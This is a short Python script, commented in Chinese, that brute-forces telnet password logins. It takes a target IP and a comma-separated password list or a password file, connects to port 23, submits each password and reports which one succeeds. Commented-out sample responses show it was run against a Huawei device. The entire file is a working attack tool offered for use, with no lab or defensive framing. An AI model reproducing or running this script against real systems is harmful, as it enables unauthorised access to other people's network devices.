# -*- coding:utf-8 -*-


"""
    仅破解telnet的密码登录方式
"""

import socket;
import sys;
import time;

# 获取命令行参数
# ['./telnet_password_brute.py', '-t', '192.168.111.148', '-p', '123']
argvs = sys.argv[:];
#print (argvs)
# 获取自己的文件名
file_name = argvs[0].split('/')[-1];
# 帮助消息
msg = f'''Syntax: {file_name} -t Target  [-p PASS|-P FILE]\n\n
Options:
    -t Target    the target server 
    -p PASS  or -P FILE  try password PASS, or load several passwords from FILE\n
Examples:
  {file_name} -t 192.168.0.1 -p 123,admin,admin@123
  {file_name} -t 192.168.0.1 -P pass.txt
''';
# 检测用户输入的参数是否有误
if len(argvs) != 5:
    print (msg);
    sys.exit();
if (argvs[1] != '-t'):
    print (msg);
    sys.exit();
if ((argvs[3] != '-p') and (argvs[3] != '-P')):
    print (msg);
    sys.exit();
# 提取服务器IP
telnet_server_ip = argvs[2];
# 判断用户输入的是密码列表还是密码文件
if (argvs[3] == '-p'):
    passwords = argvs[4].split(',');
if (argvs[3] == '-P'):
    # 提取密码文件
    password_file = argvs[4];
    # 读取密码字典
    with open(password_file,'r',encoding='utf-8') as password_file_object:
        passwords = password_file_object.read().split('\n');
# 等待延迟
timeout = 0.5;
# 缓冲区大小
buffer_size = 4096;


def client(password):
    # 创建一个客户端
    telnet_client = socket.socket();
    # 连接到服务器
    telnet_client.connect((telnet_server_ip,23));
    # 发送一个空数据
    telnet_client.send(b'/r');
    # 等待延迟
    time.sleep(timeout);
    # 接受服务器返回
    recv = b'';
    recv = telnet_client.recv(4096);
    # print (recv);
    # b'\xff\xfb\x01\xff\xfb\x01\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f\r\r\n\r\nLogin authentication\r\n\r\n\r\nPassword:'
    # 检测返回的结果中是否出现password字样
    if b'password' in  recv.lower():
        # 发送密码到服务器
        telnet_client.send(f'{password}\r\n'.encode('utf-8'));
    # 等待延迟
    time.sleep(timeout);
    # 接收收服务器返回
    recv = b'';
    recv = telnet_client.recv(4096);
    #print (recv);
    #b'\r\nInfo: The max number of VTY users is 5, and the number\r\n      of current VTY users on line is 2.\r\n      The current login time is 2020-12-19 11:29:46.\r\n<Huawei>'
    # 检测服务器返回中是否出现invalid或error之类的字样
    if (b'invalid' in recv.lower()) or (b'error' in recv.lower()):
        print (f'[-]Error Password: {password}');
        # 关闭客户端
        telnet_client.close();
    else:
        print (f'[+]The Telnet Server Password is: {password}');
        # 关闭客户端
        telnet_client.close();
        sys.exit();
    
    

# 打印消息
print (f'[+]正在尝试破解{telnet_server_ip}');


# 破解密码
for password in passwords:
    #print (f'[+]当前破解密码:{password}');
    client(password);
